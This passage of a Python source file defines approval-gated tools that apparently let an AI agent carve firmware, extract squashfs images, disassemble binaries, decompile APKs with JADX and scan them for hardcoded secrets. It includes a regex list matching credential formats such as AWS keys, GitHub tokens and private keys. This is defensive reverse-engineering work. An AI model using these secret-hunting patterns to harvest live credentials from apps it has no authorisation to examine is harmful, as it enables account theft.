    offset = max(0, int(args.get("offset") or 0))
    if offset >= size:
        return {"error": f"offset 0x{offset:x} >= file size 0x{size:x}"}
    length_raw = int(args.get("length") or 0)
    if length_raw <= 0:
        length = size - offset
    else:
        length = min(length_raw, size - offset)
    # cap absurd carves so runaway tool calls can't fill the disk
    max_carve = max(1024, min(int(args.get("max_bytes") or 512 * 1024 * 1024),
                              2 * 1024 * 1024 * 1024))
    if length > max_carve:
        return {"error": f"carve length {length} exceeds max_bytes {max_carve}; pass max_bytes explicitly to override."}

    dest_name = (args.get("dest_name") or f"{src.stem}_at_0x{offset:x}.bin").strip()
    if "/" in dest_name or "\\" in dest_name or ".." in dest_name:
        return {"error": "dest_name must be a single filename (no slashes)"}
    dest = src.parent / dest_name
    if dest.exists() and not args.get("overwrite"):
        return {"error": f"destination exists: {dest}. Pass overwrite:true or pick a new dest_name."}

    # carving creates a new file, so gate behind approval like other writes
    approval = request_approval(
        title="Carve file",
        command=f'carve: "{src.name}" [0x{offset:x}..+0x{length:x}] -> "{dest.name}"',
        details={"kind": "carve_file", "source": str(src), "dest": str(dest),
                 "offset": offset, "length": length},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied carve ({approval.get('status')})"}

    try:
        chunk = 1024 * 1024
        written = 0
        head_hex = ""
        with open(src, "rb") as f, open(dest, "wb") as o:
            f.seek(offset)
            remaining = length
            while remaining > 0:
                buf = f.read(min(chunk, remaining))
                if not buf:
                    break
                if written == 0:
                    head_hex = buf[:16].hex()
                o.write(buf)
                written += len(buf)
                remaining -= len(buf)
        # identify carved magic so the model knows what tool to chain next
        try:
            with open(dest, "rb") as f:
                head = f.read(512)
            magic = _fw_identify_magic(head) or "unknown"
        except Exception:
            magic = "unknown"
        return {
            "ok": True,
            "source": str(src),
            "dest": str(dest),
            "offset": offset,
            "offset_hex": f"0x{offset:x}",
            "length": written,
            "head_hex": head_hex,
            "magic": magic,
        }
    except Exception as e:
        try:
            if dest.exists():
                dest.unlink()
        except Exception:
            pass
        return {"error": str(e)}


def tool_extract_squashfs(args: dict) -> dict:
    """Extract a squashfs image into a sandbox subdirectory next to the source.
    Pure-Python via PySquashfsImage — no system squashfs-tools needed. Refuses
    path-traversal in archive members. Requires user approval (destructive)."""
    if not _HAVE_SQUASHFS:
        return {"error": "PySquashfsImage not installed. pip install PySquashfsImage"}
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    src = Path(path)
    dest_name = (args.get("dest_name") or f"{src.stem}_rootfs").strip()
    if "/" in dest_name or "\\" in dest_name or ".." in dest_name:
        return {"error": "dest_name must be a single folder name (no slashes)"}
    dest = src.parent / dest_name
    if dest.exists() and not args.get("overwrite"):
        return {"error": f"destination exists: {dest}. Pass overwrite:true or pick a new dest_name."}

    # quick magic sanity check
    try:
        with open(src, "rb") as f:
            head = f.read(8)
    except Exception as e:
        return {"error": f"could not read source: {e}"}
    if not (head.startswith(b"hsqs") or head.startswith(b"sqsh")):
        return {"error": f"not a squashfs image (magic={head[:4].hex()}). Try binwalk_scan to find the offset and carve first."}

    approval = request_approval(
        title="Extract squashfs",
        command=f'extract squashfs: "{src.name}" -> "{dest.name}"',
        details={"kind": "extract_squashfs", "source": str(src), "dest": str(dest)},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied extraction ({approval.get('status')})"}

    def _safe_member(name: str) -> str | None:
        n = (name or "").replace("\\", "/").lstrip("/")
        if not n or ".." in n.split("/"):
            return None
        return n

    try:
        if dest.exists():
            shutil.rmtree(dest)
        dest.mkdir(parents=True)

        files_written = 0
        symlinks = 0
        skipped = 0
        total_bytes = 0

        with SquashFsImage.from_file(str(src)) as img:
            for entry in img:
                try:
                    rel = (getattr(entry, "path", "") or "").lstrip("/")
                    n = _safe_member(rel)
                    if not n:
                        skipped += 1
                        continue
                    out = dest / n
                    if getattr(entry, "is_dir", False):
                        out.mkdir(parents=True, exist_ok=True)
                        continue
                    out.parent.mkdir(parents=True, exist_ok=True)
                    if getattr(entry, "is_symlink", False):
                        # write symlink target as a tiny text file - Windows
                        # can't always make real symlinks without admin
                        target = getattr(entry, "readlink", lambda: "")()
                        try:
                            with open(out, "w", encoding="utf-8") as o:
                                o.write(f"[symlink] -> {target}\n")
                            symlinks += 1
                        except Exception:
                            skipped += 1
                        continue
                    if not getattr(entry, "is_file", True):
                        skipped += 1
                        continue
                    try:
                        data = entry.read_bytes()
                    except Exception:
                        # API drift fallback
                        try:
                            with entry.open() as fp:  # type: ignore[attr-defined]
                                data = fp.read()
                        except Exception:
                            skipped += 1
                            continue
                    with open(out, "wb") as o:
                        o.write(data)
                    files_written += 1
                    total_bytes += len(data)
                except Exception:
                    skipped += 1
                    continue

        return {
            "ok": True,
            "source": str(src),
            "dest": str(dest),
            "files_written": files_written,
            "symlinks": symlinks,
            "skipped": skipped,
            "total_bytes": total_bytes,
        }
    except Exception as e:
        try:
            shutil.rmtree(dest, ignore_errors=True)
        except Exception:
            pass
        return {"error": str(e)}


# Skip these directories during recursive grep — they explode result counts
# without surfacing useful matches in firmware-analysis contexts.
_GREP_SKIP_DIRS = {
    ".git", ".svn", ".hg", "__pycache__", "node_modules",
    ".venv", "venv", ".tox", "dist", "build",
}

# Files larger than this (per file) are skipped. Avoids wasting cycles
# grepping multi-MB binaries where strings_dump is the right tool.
_GREP_MAX_FILE_BYTES = 4 * 1024 * 1024


def tool_grep_files(args: dict) -> dict:
    """Recursive regex search across a directory tree. Returns matches with
    file path, line number, and the matched line (truncated). Skips binary
    files (null-byte heuristic) and obvious noise dirs (.git, node_modules).
    Best for searching extracted firmware roots for keywords like 'system(',
    'sprintf', auth strings, hardcoded creds, CGI handler names."""
    root, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isdir(root):
        return {"error": f"not a directory: {root}"}
    pattern = args.get("pattern") or ""
    if not pattern:
        return {"error": "missing pattern"}
    glob_pat = (args.get("glob") or "").strip() or None
    case_insensitive = bool(args.get("case_insensitive"))
    max_matches = max(1, min(int(args.get("max_matches") or 200), 2000))
    max_files = max(1, min(int(args.get("max_files") or 5000), 50000))
    flags = re.IGNORECASE if case_insensitive else 0
    try:
        rx = re.compile(pattern, flags)
    except re.error as e:
        return {"error": f"bad regex: {e}"}

    matches: list[dict] = []
    files_scanned = 0
    files_skipped_binary = 0
    files_skipped_size = 0
    truncated = False

    try:
        for cur_dir, dirnames, filenames in os.walk(root):
            # prune noise dirs in-place
            dirnames[:] = [d for d in dirnames if d not in _GREP_SKIP_DIRS]
            for fn in filenames:
                if files_scanned >= max_files:
                    truncated = True
                    break
                fp = os.path.join(cur_dir, fn)
                if glob_pat:
                    try:
                        if not Path(fp).match(glob_pat) and not fnmatch.fnmatch(fn, glob_pat):
                            continue
                    except Exception:
                        if not fnmatch.fnmatch(fn, glob_pat):
                            continue
                try:
                    st = os.stat(fp)
                except OSError:
                    continue
                if st.st_size > _GREP_MAX_FILE_BYTES:
                    files_skipped_size += 1
                    continue
                # null-byte heuristic on first 4KB to skip binaries
                try:
                    with open(fp, "rb") as f:
                        sniff = f.read(4096)
                    if b"\x00" in sniff:
                        files_skipped_binary += 1
                        continue
                    with open(fp, "r", encoding="utf-8", errors="replace") as f:
                        for lineno, line in enumerate(f, start=1):
                            if rx.search(line):
                                matches.append({
                                    "path": fp,
                                    "line": lineno,
                                    "text": line.rstrip("\n")[:400],
                                })
                                if len(matches) >= max_matches:
                                    truncated = True
                                    break
                    files_scanned += 1
                    if truncated:
                        break
                except Exception:
                    continue
            if truncated:
                break
        return {
            "root": root,
            "pattern": pattern,
            "match_count": len(matches),
            "files_scanned": files_scanned,
            "files_skipped_binary": files_skipped_binary,
            "files_skipped_size": files_skipped_size,
            "truncated": truncated,
            "matches": matches,
        }
    except Exception as e:
        return {"error": str(e)}


# Capstone arch/mode mapping. Values resolved lazily so we don't fail
# import on systems without capstone.
def _capstone_md(arch: str, mode: str):
    if not _HAVE_CAPSTONE:
        return None, "capstone not installed"
    arch = (arch or "").lower()
    mode = (mode or "").lower()
    cs = _capstone
    arch_map = {
        "x86": (cs.CS_ARCH_X86, cs.CS_MODE_32),
        "x64": (cs.CS_ARCH_X86, cs.CS_MODE_64),
        "x86_64": (cs.CS_ARCH_X86, cs.CS_MODE_64),
        "amd64": (cs.CS_ARCH_X86, cs.CS_MODE_64),
        "arm": (cs.CS_ARCH_ARM, cs.CS_MODE_ARM),
        "thumb": (cs.CS_ARCH_ARM, cs.CS_MODE_THUMB),
        "arm64": (cs.CS_ARCH_ARM64, cs.CS_MODE_ARM),
        "aarch64": (cs.CS_ARCH_ARM64, cs.CS_MODE_ARM),
        "mips": (cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32),
        "mips32": (cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32),
        "mips64": (cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS64),
        "ppc": (cs.CS_ARCH_PPC, cs.CS_MODE_32),
        "ppc64": (cs.CS_ARCH_PPC, cs.CS_MODE_64),
    }
    if arch not in arch_map:
        return None, f"unsupported arch: {arch}. Try: x86, x64, arm, thumb, arm64, mips, mips64, ppc, ppc64."
    cs_arch, cs_mode = arch_map[arch]
    # endianness override for MIPS/ARM/PPC
    if mode in ("le", "little"):
        cs_mode |= cs.CS_MODE_LITTLE_ENDIAN
    elif mode in ("be", "big"):
        cs_mode |= cs.CS_MODE_BIG_ENDIAN
    try:
        md = cs.Cs(cs_arch, cs_mode)
        md.detail = False
        return md, None
    except Exception as e:
        return None, f"capstone init failed: {e}"


def tool_disasm_at(args: dict) -> dict:
    """Disassemble N instructions at a file offset. Supports x86/x64/arm/
    thumb/arm64/mips/mips32/mips64/ppc/ppc64. Auto-detects arch/endianness
    when target is an ELF and arch arg is omitted. Use to inspect a function
    near an offset surfaced by binwalk_scan or a string xref."""
    if not _HAVE_CAPSTONE:
        return {"error": "capstone not installed. pip install capstone"}
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    offset = max(0, int(args.get("offset") or 0))
    count = max(1, min(int(args.get("count") or 32), 256))
    bytes_to_read = max(16, min(int(args.get("max_bytes") or 4096), 16 * 1024))
    arch = (args.get("arch") or "").strip()
    mode = (args.get("mode") or "").strip()
    base_addr = int(args.get("address") or offset)

    try:
        # auto-detect from ELF if arch not provided
        if not arch and _HAVE_ELFTOOLS:
            try:
                with open(path, "rb") as f:
                    if f.read(4) == b"\x7fELF":
                        f.seek(0)
                        elf = ELFFile(f)
                        em = elf.header["e_machine"]
                        ei = elf.header["e_ident"]["EI_DATA"]
                        cls = elf.header["e_ident"]["EI_CLASS"]
                        endian = "le" if "LSB" in ei else "be"
                        m = {
                            "EM_X86_64": ("x64", endian),
                            "EM_386": ("x86", endian),
                            "EM_ARM": ("arm", endian),
                            "EM_AARCH64": ("arm64", endian),
                            "EM_MIPS": ("mips64" if "ELFCLASS64" in cls else "mips32", endian),
                            "EM_PPC": ("ppc", endian),
                            "EM_PPC64": ("ppc64", endian),
                        }
                        if em in m:
                            arch = arch or m[em][0]
                            mode = mode or m[em][1]
            except Exception:
                pass

        if not arch:
            return {"error": "could not detect architecture; pass arch (e.g. mips, arm, x64)."}

        md, merr = _capstone_md(arch, mode)
        if merr:
            return {"error": merr}

        with open(path, "rb") as f:
            f.seek(offset)
            blob = f.read(bytes_to_read)
        if not blob:
            return {"error": f"no bytes at offset 0x{offset:x}"}

        instrs: list[dict] = []
        for ins in md.disasm(blob, base_addr):
            instrs.append({
                "address": f"0x{ins.address:x}",
                "bytes": ins.bytes.hex(),
                "mnemonic": ins.mnemonic,
                "op_str": ins.op_str,
            })
            if len(instrs) >= count:
                break

        return {
            "path": path,
            "arch": arch,
            "mode": mode or "default",
            "offset": offset,
            "address": f"0x{base_addr:x}",
            "instruction_count": len(instrs),
            "bytes_read": len(blob),
            "instructions": instrs,
        }
    except Exception as e:
        return {"error": str(e)}


# ---- APK static analysis -------------------------------------------------
# Two complementary tools:
#
#   scan_apk(path)     — pure-Python triage. Parses AndroidManifest, lists
#                        permissions/components/cert info, mines DEX + .so
#                        for printable strings, and runs a regex pass for
#                        common secret/leak patterns (AWS/GCP/Firebase keys,
#                        JWTs, hardcoded URLs, etc). Returns ONE structured
#                        JSON report the model can reason over without
#                        re-fetching individual files.
#
#   decompile_apk(...) — shells out to JADX (Java decompiler) and writes
#                        decompiled .java sources into the workspace. The
#                        model then uses read_file / grep_files on the
#                        output dir. Requires java + jadx on the host;
#                        path can be set via settings.jadx_path.
#
# Both refuse paths outside the workspace via _fw_check_path. decompile_apk
# is destructive (writes a folder) and gated by request_approval. scan_apk
# is read-only.

# Regex patterns for the secret/leak hunt. Conservative — false-positive
# rate matters more than recall for an LLM workflow (the model wastes a
# lot of context chasing red herrings). Each entry:
#   (label, compiled_regex, min_match_length_for_positive)
_APK_SECRET_RE: list[tuple[str, "re.Pattern[bytes]", int]] = [
    ("aws_access_key_id",        re.compile(rb"\b(?:AKIA|ASIA)[0-9A-Z]{16}\b"),                                 20),
    ("aws_secret_access_key",    re.compile(rb"(?i)aws(.{0,20})?(secret|sk)[^a-z0-9]{0,5}([A-Za-z0-9/+=]{40})"),  40),
    ("google_api_key",           re.compile(rb"\bAIza[0-9A-Za-z_\-]{35}\b"),                                     39),
    ("firebase_db_url",          re.compile(rb"https?://[a-z0-9\-]+\.firebaseio\.com\b"),                        20),
    ("firebase_app_url",         re.compile(rb"https?://[a-z0-9\-]+\.firebaseapp\.com\b"),                       20),
    ("gcp_service_account",      re.compile(rb"\"type\"\s*:\s*\"service_account\""),                             20),
    ("jwt",                      re.compile(rb"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b"), 60),
    ("github_pat",               re.compile(rb"\bghp_[A-Za-z0-9]{36}\b"),                                         40),
    ("github_app_token",         re.compile(rb"\b(?:ghs|ghu|gho|ghr)_[A-Za-z0-9]{36}\b"),                         40),
    ("slack_token",              re.compile(rb"\bxox[abpr]-[A-Za-z0-9\-]{10,}\b"),                                15),
    ("stripe_secret",            re.compile(rb"\bsk_(?:live|test)_[0-9a-zA-Z]{24,}\b"),                           28),
    ("stripe_publishable",       re.compile(rb"\bpk_(?:live|test)_[0-9a-zA-Z]{24,}\b"),                           28),
    ("private_key_pem",          re.compile(rb"-----BEGIN (?:RSA |DSA |EC |OPENSSH |ENCRYPTED |PGP )?PRIVATE KEY-----"), 30),
    ("twilio_sid",               re.compile(rb"\bAC[a-f0-9]{32}\b"),                                              34),
    ("sendgrid_api_key",         re.compile(rb"\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b"),                  60),
    ("mailgun_api_key",          re.compile(rb"\bkey-[a-z0-9]{32}\b"),                                            36),
    ("generic_secret_assignment",re.compile(rb"(?i)(?:api[_-]?key|secret|password|passwd|pwd|token|bearer)[\s:=\"']{1,5}[A-Za-z0-9_\-/+=]{16,}"), 25),
    ("hardcoded_http_endpoint",  re.compile(rb"https?://[a-zA-Z0-9.\-]+(?::\d+)?(?:/[^\s\"'<>]*)?"),              10),
    ("ipv4_literal",             re.compile(rb"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d?\d)\b"), 7),
]

# Permissions Android marks as "dangerous" or otherwise interesting. We use
# a static list rather than querying androguard at runtime — covers the bulk
# of real-world risk surface without a 1000-entry dump.
_APK_DANGEROUS_PERMS = {
    "android.permission.READ_CONTACTS",
    "android.permission.WRITE_CONTACTS",
    "android.permission.READ_CALENDAR",
    "android.permission.WRITE_CALENDAR",
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.ACCESS_BACKGROUND_LOCATION",
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_PHONE_NUMBERS",
    "android.permission.READ_CALL_LOG",
    "android.permission.WRITE_CALL_LOG",
    "android.permission.PROCESS_OUTGOING_CALLS",
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.MANAGE_EXTERNAL_STORAGE",
    "android.permission.SYSTEM_ALERT_WINDOW",
    "android.permission.REQUEST_INSTALL_PACKAGES",
    "android.permission.PACKAGE_USAGE_STATS",
    "android.permission.BIND_ACCESSIBILITY_SERVICE",
    "android.permission.BIND_DEVICE_ADMIN",
    "android.permission.QUERY_ALL_PACKAGES",
    "android.permission.READ_LOGS",
    "android.permission.GET_ACCOUNTS",
    "android.permission.AUTHENTICATE_ACCOUNTS",
    "android.permission.USE_CREDENTIALS",
    "android.permission.MANAGE_ACCOUNTS",
    "android.permission.WRITE_SETTINGS",
    "android.permission.WRITE_SECURE_SETTINGS",
    "android.permission.MOUNT_UNMOUNT_FILESYSTEMS",
    "android.permission.INSTALL_PACKAGES",
    "android.permission.DELETE_PACKAGES",
    "android.permission.CLEAR_APP_USER_DATA",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.WAKE_LOCK",
    "android.permission.DISABLE_KEYGUARD",
    "android.permission.SYSTEM_OVERLAY_WINDOW",
}


def _apk_hunt_secrets(label: str, data: bytes, max_per_pattern: int = 25) -> list[dict]:
    """Run all _APK_SECRET_RE patterns over a blob and return findings.
    Each finding includes a redacted preview so the model sees enough context
    to judge severity without us echoing every hardcoded token verbatim."""
    out: list[dict] = []
    for kind, rx, min_hit_len in _APK_SECRET_RE:
        seen: set[bytes] = set()
        n = 0
        for m in rx.finditer(data):
            hit = m.group(0)
            if len(hit) < min_hit_len:
                continue
            if hit in seen:
                continue
            seen.add(hit)
            try:
                preview = hit.decode("utf-8", errors="replace")
            except Exception:
                preview = repr(hit)
            # Redact the middle of long literals — keep first 8 + last 4.
            if len(preview) > 24 and kind not in {"hardcoded_http_endpoint", "ipv4_literal", "firebase_db_url", "firebase_app_url"}:
                preview = preview[:8] + "…[redacted]…" + preview[-4:]
            out.append({"source": label, "kind": kind, "match": preview[:200]})
            n += 1
            if n >= max_per_pattern:
                break
    return out


def tool_scan_apk(args: dict) -> dict:
    """Phase-1 APK static scan. Returns a structured report covering:
    package metadata, signing certs, requested permissions (flagged for
    'dangerous' ones), exported components, dex/native lib inventory,
    and a secret-pattern hunt over DEX + .so + raw resource files. Pure
    Python — uses androguard if available, falls back to zipfile-only mode
    for basic file inventory if not."""
    import zipfile as _zip

    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}

    max_secret_findings = max(10, min(int(args.get("max_secret_findings") or 200), 2000))
    max_string_bytes = max(64 * 1024, min(int(args.get("max_string_bytes") or 8 * 1024 * 1024),
                                          64 * 1024 * 1024))
    deep = bool(args.get("deep"))  # if true, scan every file in the APK, not just dex/so

    out: dict = {
        "path": path,
        "size": os.path.getsize(path),
        "androguard_available": _HAVE_ANDROGUARD,
        "manifest": {},
        "signing": {},
        "permissions": {"all": [], "dangerous": []},
        "components": {"activities": [], "services": [], "receivers": [], "providers": []},
        "exported_components": [],
        "dex_files": [],
        "native_libs": [],
        "assets": [],
        "secret_findings": [],
        "warnings": [],
        "notes": [],
    }

    # --- step 1: ZIP inventory (always works, no androguard needed) -----
    try:
        with _zip.ZipFile(path) as z:
            names = z.namelist()
    except _zip.BadZipFile:
        return {"error": "not a valid APK (bad ZIP signature)"}

    out["dex_files"] = [n for n in names if n.endswith(".dex")]
    out["native_libs"] = [n for n in names if n.startswith("lib/") and n.endswith(".so")]
    out["assets"] = [n for n in names if n.startswith("assets/")][:200]
    out["file_count"] = len(names)

    # --- step 2: manifest + signing via androguard ----------------------
    if _HAVE_ANDROGUARD:
        try:
            apk = _AndroidAPK(path)
            out["manifest"] = {
                "package": apk.get_package(),
                "version_name": apk.get_androidversion_name(),
                "version_code": apk.get_androidversion_code(),
                "min_sdk": apk.get_min_sdk_version(),
                "target_sdk": apk.get_target_sdk_version(),
                "main_activity": apk.get_main_activity(),
                "app_name": apk.get_app_name(),
                "is_debuggable": bool(apk.get_element("application", "debuggable") == "true"),
                "allows_backup": (apk.get_element("application", "allowBackup") != "false"),
                "uses_cleartext_traffic": (apk.get_element("application", "usesCleartextTraffic") == "true"),
            }
            perms = list(apk.get_permissions() or [])
            out["permissions"]["all"] = sorted(perms)
            out["permissions"]["dangerous"] = sorted(p for p in perms if p in _APK_DANGEROUS_PERMS)
            out["components"]["activities"] = list(apk.get_activities() or [])[:200]
            out["components"]["services"] = list(apk.get_services() or [])[:200]
            out["components"]["receivers"] = list(apk.get_receivers() or [])[:200]
            out["components"]["providers"] = list(apk.get_providers() or [])[:200]
            try:
                # Each kind has an exported flag we can pull via androguard's
                # get_element. Compile a flat exported list with kind tags.
                exported: list[dict] = []
                for kind, items in (
                    ("activity", apk.get_activities() or []),
                    ("service", apk.get_services() or []),
                    ("receiver", apk.get_receivers() or []),
                    ("provider", apk.get_providers() or []),
                ):
                    for name in items:
                        is_exp = apk.get_element(kind, "exported", name=name) == "true"
                        if is_exp:
                            exported.append({"kind": kind, "name": name})
                out["exported_components"] = exported
            except Exception as e:
                out["warnings"].append(f"exported-component scan failed: {e}")
            # Signing certs — list issuers + sha256 fingerprints, no key bytes.
            try:
                certs = apk.get_certificates() or []
                sig_v1 = apk.get_signature_names() or []
                out["signing"] = {
                    "v1_signature_files": list(sig_v1)[:10],
                    "is_signed_v1": apk.is_signed_v1() if hasattr(apk, "is_signed_v1") else None,
                    "is_signed_v2": apk.is_signed_v2() if hasattr(apk, "is_signed_v2") else None,
                    "is_signed_v3": apk.is_signed_v3() if hasattr(apk, "is_signed_v3") else None,
                    "certificates": [
                        {
                            "subject": str(getattr(c, "subject", "")),
                            "issuer": str(getattr(c, "issuer", "")),
                            "sha256": (getattr(c, "sha256_fingerprint", "") or "").lower(),
                        }
                        for c in certs[:5]
                    ],
                }
            except Exception as e:
                out["warnings"].append(f"signing parse failed: {e}")
        except Exception as e:
            out["warnings"].append(f"androguard manifest parse failed: {e}")
    else:
        out["notes"].append(
            "androguard not installed — manifest/permissions/components skipped. "
            "Run `pip install androguard` to enable full scan."
        )

    # --- step 3: secret hunt over DEX + .so + (optionally) everything ---
    targets = list(out["dex_files"]) + list(out["native_libs"])
    if deep:
        # everything text-ish or unidentified — skip giant pngs/jpgs/webps/mp4/zip-in-zip
        skip_ext = {".png", ".jpg", ".jpeg", ".webp", ".gif", ".mp4", ".mkv", ".webm", ".ogg", ".mp3", ".wav"}
        for n in names:
            if n in targets:
                continue
            ext = Path(n).suffix.lower()
            if ext in skip_ext:
                continue
            targets.append(n)

    bytes_scanned = 0
    findings: list[dict] = []
    try:
        with _zip.ZipFile(path) as z:
            for n in targets:
                try:
                    with z.open(n) as f:
                        chunk = f.read(max_string_bytes - bytes_scanned if max_string_bytes > bytes_scanned else 0)
                except KeyError:
                    continue
                if not chunk:
                    continue
                bytes_scanned += len(chunk)
                # Hunt over the raw blob first (catches embedded JSON, manifest fragments)
                hits = _apk_hunt_secrets(n, chunk)
                if hits:
                    findings.extend(hits)
                if len(findings) >= max_secret_findings or bytes_scanned >= max_string_bytes:
                    break
    except Exception as e:
        out["warnings"].append(f"secret hunt failed: {e}")

    # Dedupe (source, kind, match) tuples — same string in two dex files is noise
    seen_keys: set[tuple] = set()
    deduped: list[dict] = []
    for f in findings:
        key = (f["kind"], f["match"])  # source-agnostic dedupe; first source wins
        if key in seen_keys:
            continue
        seen_keys.add(key)
        deduped.append(f)
    out["secret_findings"] = deduped[:max_secret_findings]
    out["secret_findings_total"] = len(findings)
    out["bytes_scanned"] = bytes_scanned
    out["scan_truncated"] = bytes_scanned >= max_string_bytes

    # --- step 4: surface a quick risk summary the model can lead with ---
    risk: list[str] = []
    m = out["manifest"]
    if m.get("is_debuggable"):
        risk.append("debuggable=true (production APKs should never ship this)")
    if m.get("allows_backup"):
        risk.append("allowBackup not disabled (data extractable via adb backup)")
    if m.get("uses_cleartext_traffic"):
        risk.append("usesCleartextTraffic=true (HTTP plaintext permitted)")
    if out["permissions"]["dangerous"]:
        risk.append(f"{len(out['permissions']['dangerous'])} dangerous permissions requested")
    if out["exported_components"]:
        risk.append(f"{len(out['exported_components'])} exported components (check intent filters)")
    secret_kinds = {f["kind"] for f in out["secret_findings"]
                    if f["kind"] not in {"hardcoded_http_endpoint", "ipv4_literal"}}
    if secret_kinds:
        risk.append(f"possible secrets: {', '.join(sorted(secret_kinds))}")
    out["risk_summary"] = risk

    return out


def _resolve_jadx_bin() -> str | None:
    """Find a jadx executable. Settings override > PATH > common install dirs."""
    s = get_settings()
    custom = (s.get("jadx_path") or "").strip()
    if custom and os.path.isfile(custom):
        return custom
    # PATH lookup
    for cand in ("jadx", "jadx.bat", "jadx.cmd"):
        p = shutil.which(cand)
        if p:
            return p
    # Common Windows install locations
    for guess in (
        Path(os.environ.get("ProgramFiles", r"C:\Program Files")) / "jadx" / "bin" / "jadx.bat",
        Path(os.environ.get("LOCALAPPDATA", "")) / "Programs" / "jadx" / "bin" / "jadx.bat",
        Path.home() / "jadx" / "bin" / "jadx.bat",
    ):
        try:
            if guess.is_file():
                return str(guess)
        except Exception:
            continue
    return None


def tool_decompile_apk(args: dict) -> dict:
    """Phase-2 APK decompile. Shells out to JADX and writes Java sources +
    resources into a sandbox subdirectory next to the APK. The model can
    then read/grep the output dir using existing tools. Destructive (writes
    files) — gated by approval. Java 11+ and JADX must be installed; set
    settings.jadx_path if jadx is not on PATH."""
    path, err = _fw_check_path(args.get("path") or "")
    if err:
        return err
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}
    src = Path(path)
    if src.suffix.lower() not in {".apk", ".xapk", ".aab"}:
        return {"error": f"not an APK/AAB: {src.name}"}

    dest_name = (args.get("dest_name") or f"{src.stem}_jadx").strip()
    if "/" in dest_name or "\\" in dest_name or ".." in dest_name:
        return {"error": "dest_name must be a single folder name (no slashes)"}
    dest = src.parent / dest_name
    overwrite = bool(args.get("overwrite"))
    if dest.exists() and not overwrite:
        return {"error": f"destination exists: {dest}. Pass overwrite:true or pick a new dest_name."}

    jadx = _resolve_jadx_bin()
    if not jadx:
        return {
            "error": (
                "jadx not found. Install from https://github.com/skylot/jadx/releases "
                "(needs Java 11+), then either add it to PATH or set settings.jadx_path "
                "to the full path of jadx.bat."
            )
        }

    timeout = max(30, min(int(args.get("timeout") or 600), 3600))
    deobf = bool(args.get("deobf", True))
    show_bad_code = bool(args.get("show_bad_code", True))
    no_res = bool(args.get("no_res"))
    no_src = bool(args.get("no_src"))
    classes = (args.get("classes") or "").strip()  # passed to --classes-only-glob if present

    cmd: list[str] = [jadx, "-d", str(dest)]
    if deobf:
        cmd.append("--deobf")
    if show_bad_code:
        cmd.append("--show-bad-code")
    if no_res:
        cmd.append("--no-res")
    if no_src:
        cmd.append("--no-src")
    if classes:
        # JADX 1.5+ supports --class-list to scope decompilation. Older versions
        # ignore unknown flags; the call still works, just decompiles everything.
        cmd += ["--include-classes", classes]
    cmd.append(str(src))

    approval = request_approval(
        title="Decompile APK with JADX",
        command=f'jadx -d "{dest.name}" "{src.name}"' + (f' (filter: {classes})' if classes else ""),
        details={
            "kind": "decompile_apk",
            "source": str(src),
            "dest": str(dest),
            "jadx": jadx,
            "timeout_s": timeout,
            "command": cmd,
        },
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied decompile ({approval.get('status')})"}

    if dest.exists() and overwrite:
        shutil.rmtree(dest, ignore_errors=True)
    dest.mkdir(parents=True, exist_ok=True)

    t0 = time.time()
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
            shell=False,
        )
    except subprocess.TimeoutExpired:
        return {"error": f"jadx timed out after {timeout}s. Try --no-res, narrower --classes filter, or a longer timeout."}
    except FileNotFoundError:
        return {"error": f"jadx binary not executable: {jadx}"}
    except Exception as e:
        return {"error": f"jadx invocation failed: {e}"}

    elapsed = round(time.time() - t0, 2)
    # Walk the output and produce a compact summary the model can navigate.
    java_files: list[str] = []
    res_files: list[str] = []
    other: list[str] = []
    total_bytes = 0
    for root, _dirs, files in os.walk(dest):
        for fn in files:
            p = os.path.join(root, fn)
            try:
                total_bytes += os.path.getsize(p)
            except OSError:
                pass
            rel = os.path.relpath(p, dest).replace("\\", "/")
            ext = fn.rsplit(".", 1)[-1].lower()
            if ext == "java":
                java_files.append(rel)
            elif ext in {"xml", "png", "jpg", "jpeg", "webp", "json", "ttf", "otf", "html"}:
                res_files.append(rel)
            else:
                other.append(rel)

    return {
        "ok": proc.returncode == 0,
        "exit_code": proc.returncode,
        "elapsed_s": elapsed,
        "jadx": jadx,
        "command": " ".join(f'"{c}"' if " " in c else c for c in cmd),
        "source": str(src),
        "dest": str(dest),
        "stdout_tail": (proc.stdout or "")[-2000:],
        "stderr_tail": (proc.stderr or "")[-2000:],
        "output_summary": {
            "total_bytes": total_bytes,
            "java_count": len(java_files),
            "resource_count": len(res_files),
            "other_count": len(other),
            # cap the file lists so a 30k-class APK doesn't nuke the model context
            "java_sample": java_files[:200],
            "resources_sample": res_files[:100],
        },
        "next_steps": [
            f"grep_files path:'{dest}' pattern:'<your regex>' to hunt across decompiled sources",
            f"read_file path:'{dest}/<file>.java' for individual class inspection",
        ],
    }


# ---- Ghidra (native binary) analysis -------------------------------------
# Common dangerous symbols to flag in import lists. Not exhaustive — just the
# usual suspects for memory corruption / privilege issues / dynamic loading.
